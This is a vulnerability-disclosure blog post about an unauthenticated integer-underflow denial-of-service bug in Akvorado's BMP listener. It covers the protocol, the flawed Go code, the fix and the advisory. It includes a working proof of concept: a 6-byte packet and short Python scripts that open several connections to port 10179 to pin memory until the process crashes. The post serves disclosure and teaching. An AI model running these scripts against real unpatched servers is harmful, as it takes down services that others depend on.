---
title: "Six Bytes, Four Gigabytes: the Crash I Found in a Tool We Run"
description: "A single 6-byte packet makes Akvorado's BMP server reserve ~4 GiB, and a few connections crash it. The story of an unauthenticated integer-underflow DoS I found in a tool we run at work. CVSS 7.5, GHSA-wr88-h9r3-fqh3."
date: 2026-10-04
tags:
  - Security
  - Vulnerability Research
---

We run [Akvorado](https://github.com/akvorado/akvorado) at work, and I genuinely
like it. It is a flow collector and visualizer: it chews through NetFlow, IPFIX and
sFlow, and we use it to see how much traffic each of our users pulls so we can bill
them for it. For me it is an everyday tool, the thing I open to answer a question, not
something I ever expected to end up reporting a vulnerability in.

But I have a habit I cannot switch off. Whenever I use a tool, if I have the time and
the feeling for it, I start poking at it: clicking the things I am not supposed to,
reading how it works under the hood, wondering what happens if I feed it something it
is not expecting. Akvorado learns its routing context over
[BMP](https://datatracker.ietf.org/doc/html/rfc7854), the BGP Monitoring Protocol,
which means it runs a server that routers connect to and stream raw binary messages
into. BMP messages are length-prefixed, and a length-prefixed parser is exactly the
kind of thing I cannot leave alone. So one afternoon, instead of just using the tool, I
went reading how it reads.

I had a quiet hunch before I even found the line: it is going to trust the length on
the wire. It did. And the payoff was bigger than I expected. A single 6-byte packet
makes Akvorado reserve about 4 GiB of memory, and a small handful of connections walk
the whole process into an out-of-memory crash. No login, no handshake, and the
listener is on by default. There is a strange feeling in finding something like this
in software you actually rely on: a little bit of "nice," and a little bit of "oh, we
run this." The maintainers confirmed it, fixed it, and credited me, so it is all out
in the open now and I can tell the story.

> [!NOTE] TL;DR
> Akvorado's BMP server reads the 4-byte `Length` field from each message and
> computes `Length - 6` to size the body buffer, in unsigned 32-bit arithmetic. Any
> `Length` below 6 underflows to roughly 4.29 billion, so the server tries to
> allocate ~4 GiB for one tiny packet. `io.ReadFull` then blocks forever waiting
> for a body that never arrives, pinning that memory. Eight connections reached
> 34 GiB and the process died. Fix: validate `Length >= 6` before allocating.

## One minute on BMP

Quick shout-out before the bytes: most of what I understand about BMP, I owe to our
network manager at work, who patiently walked me through it more than once while I kept
asking "wait, but why does it do that." If this next part makes sense, the credit is
theirs.

If you have never touched BMP, here is the only part that matters for this story. It
is defined in [RFC 7854](https://datatracker.ietf.org/doc/html/rfc7854), and it is how
a router streams its BGP state to a monitoring station. Every BMP message starts with
the same 6-byte common header:

- **Version** (1 byte)
- **Message Length** (4 bytes), the total length of the message including this header
- **Message Type** (1 byte)

So a receiver reads those 6 bytes, learns how long the whole message is supposed to
be, and then reads the rest. The important thing, the thing I keep coming back to, is
that the length field is attacker-controlled by definition. It is whatever the peer on
the other end of the TCP connection says it is. You do not get to assume it is honest.

## The line that caught my eye

I was skimming the read loop in `outlet/routing/provider/bmp/serve.go`, and then this
stopped me:

```go
body := make([]byte, msg.Header.Length-bmp.BMP_HEADER_SIZE)
_, err = io.ReadFull(conn, body) // blocks until `body` is filled
```

This is the exact line I go hunting for in any length-prefixed parser: a buffer sized
straight from a number that came off the wire. Every time I see one, I ask the same two
questions. What are the boundaries of that value, and does anything check them before
the code trusts it? I read it twice to be sure I was not missing a guard somewhere
above. There was no guard. And once I did the arithmetic in my head, the worst case was
not just bad, it was almost funny.

## The trap: subtraction that wraps around

`BMP_HEADER_SIZE` is 6. `msg.Header.Length` is a `uint32`. The code subtracts one from
the other to get the body size, which is completely fine as long as `Length` is at
least 6. But unsigned subtraction does not go negative. It wraps. So any length smaller
than the header underflows to a number near the very top of the 32-bit range:

| `Length` sent | `Length - 6` | Allocation                   |
|--------------:|--------------|------------------------------|
| 0             | wraps        | 4,294,967,290 bytes (~4 GiB) |
| 1             | wraps        | 4,294,967,291 bytes (~4 GiB) |
| 5             | wraps        | 4,294,967,295 bytes (~4 GiB) |

A `Length` of 0 does not ask for 0 bytes. It asks for about 4 GiB. And here is the part
that turns a bad allocation into a dependable weapon: because the attacker never sends a
body, `io.ReadFull` just sits there, blocked forever, waiting. The giant buffer is never
freed. It stays reserved for the whole lifetime of the connection, and the attacker
controls that lifetime by doing nothing at all, simply not closing the socket.

## Six bytes

I did not want to argue from theory, so I wrote the smallest thing that could prove it.
The whole exploit is six bytes, and there is no handshake to get through first, because
the length header is the very first thing the server parses.

```text
03 00 00 00 00 04
```

Read against the common header:

- `03` : BMP version 3, which passes the version check
- `00 00 00 00` : Length = 0, the underflow trigger
- `04` : message type (initiation), just needs to be a value the server accepts

Sending it is three lines:

```python
import socket
s = socket.create_connection(("outlet-host", 10179))
s.sendall(bytes.fromhex("030000000004"))
```

Each connection that sends this pins roughly 4 GiB and then holds the socket open.

One socket proves the allocation; the crash needs a handful. Since the trick is that
the attacker does nothing after sending, "scaling" is just keeping the sockets open in a
list so Python does not garbage-collect them out from under you:

```python
import socket, time

PACKET = bytes.fromhex("030000000004")
conns = []
for _ in range(4):
    s = socket.create_connection(("outlet-host", 10179))
    s.sendall(PACKET)
    conns.append(s)  # keep a reference so the socket stays open

time.sleep(3600)  # sit here doing nothing; the ~4 GiB per connection stays pinned
```

Four connections is ~16 GiB reserved from four 6-byte packets. Point it at a box with
less headroom, or bump the range, and you are at the out-of-memory line.

## Watching it fall over

The reason this is a 7.5 and not a footnote is the context around that one line. The BMP
listener is enabled by default and binds to port `10179` on all interfaces, so on a
default deployment there is no configuration step and no credential standing between an
attacker and the bug. In CVSS terms it is `A:H` with `C:N/I:N`: it steals nothing and
changes nothing, it just takes the service down, completely.

I stood up my own instance and watched it happen, because watching a number climb is a
lot more convincing than reasoning about it. I kept `htop` open next to the terminal
I was firing packets from, watching the `VIRT` column for the Akvorado process while I
opened connections one at a time. Eight was all it took. The virtual memory marched up
to 34.03 GiB, and then the process fell over with:

```text
runtime: out of memory: cannot allocate 4294967296-byte block
```

Scaling the attack is not clever. It is just opening more sockets. That is the part that
sat with me, remembering this is the tool we point at our own traffic every day.

## The fix

The fix is almost anticlimactic, which is usually how these go: it is the check that
should have been there all along. Reject any length smaller than the header before you
use it to size anything.

```go
if msg.Header.Length < bmp.BMP_HEADER_SIZE {
    logger.Warn().Uint32("length", msg.Header.Length).
        Msg("invalid BMP message length")
    return nil
}
body := make([]byte, msg.Header.Length-bmp.BMP_HEADER_SIZE)
```

It is also worth enforcing a sane upper bound on message size, so that a large but
technically valid length cannot be turned into a big allocation either. The patch landed
in [2026.10.0](https://github.com/akvorado/akvorado/releases/tag/v2026.10.0). If you
expose BMP or IPFIX on an untrusted network, go upgrade before you finish reading this.

## Disclosure

I reported this to the Akvorado maintainers, who were quick and kind about it, confirmed
it, and shipped the fix. I am credited in both the
[advisory](https://github.com/akvorado/akvorado/security/advisories/GHSA-wr88-h9r3-fqh3)
and the [2026.10.0 release notes](https://github.com/akvorado/akvorado/releases/tag/v2026.10.0).
Seeing my handle in there is a good feeling, and I will not pretend otherwise.

| Field      | Value                                                                 |
|------------|-----------------------------------------------------------------------|
| Advisory   | [GHSA-wr88-h9r3-fqh3](https://github.com/akvorado/akvorado/security/advisories/GHSA-wr88-h9r3-fqh3) |
| Severity   | High, CVSS 7.5 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)        |
| Weaknesses | [CWE-20](https://cwe.mitre.org/data/definitions/20.html), [CWE-191](https://cwe.mitre.org/data/definitions/191.html), [CWE-400](https://cwe.mitre.org/data/definitions/400.html) |
| Affected   | 2.0.0-beta.1 through 2026.8.1                                          |
| Patched    | [2026.10.0](https://github.com/akvorado/akvorado/releases/tag/v2026.10.0) |

## What I took away

- **Length fields that feed allocations are the first thing I probe.** Before anything
  clever, I test the boundaries of any size value that came off the wire: zero, values
  below the header size, and values near the integer maximum. This bug lived at the very
  smallest input, not the largest.
- **Unsigned subtraction is a trapdoor.** `a - b` where `a < b` does not error and does
  not go negative in `uint32`, it wraps to something enormous. Any subtraction on
  attacker-influenced unsigned values deserves a bounds check first, every single time.
- **An allocation is only half the primitive.** What made this a reliable crash rather
  than a transient blip was that `io.ReadFull` blocked and kept the memory pinned. The
  really damaging resource bugs are the ones where the attacker controls both the size
  and how long it stays reserved.
- **Default-on listeners raise the stakes.** The same flaw behind an off-by-default
  feature is a much smaller deal. This one shipped enabled on all interfaces, and that is
  most of the distance from "bug" to "unauthenticated remote crash."

Mostly, though, what stuck with me is how ordinary the setup was. I was not fuzzing
anything exotic. I was reading a tool I already trusted, following a habit, and the bug
was sitting right there in plain sight. That is the part that keeps this fun for me.
